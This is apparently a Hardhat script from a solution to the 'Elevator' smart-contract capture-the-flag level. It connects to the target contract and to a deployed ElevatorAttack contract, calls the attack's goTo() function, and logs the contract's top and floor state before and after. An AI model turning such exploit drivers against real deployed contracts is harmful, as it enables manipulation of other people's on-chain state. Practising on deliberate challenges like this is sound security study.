import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x2b961E3959b79326A8e7F64Ef0d2d825707669b5"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0xD6b040736e948621c5b6E0a494473c47a6113eA8"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Elevator", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("ElevatorAttack", ATTACK_ADDRESS, signer)

  console.log(await contract.top())
  console.log(await contract.floor())

  await attackContract.goTo()

  console.log(await contract.top())
  console.log(await contract.floor())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
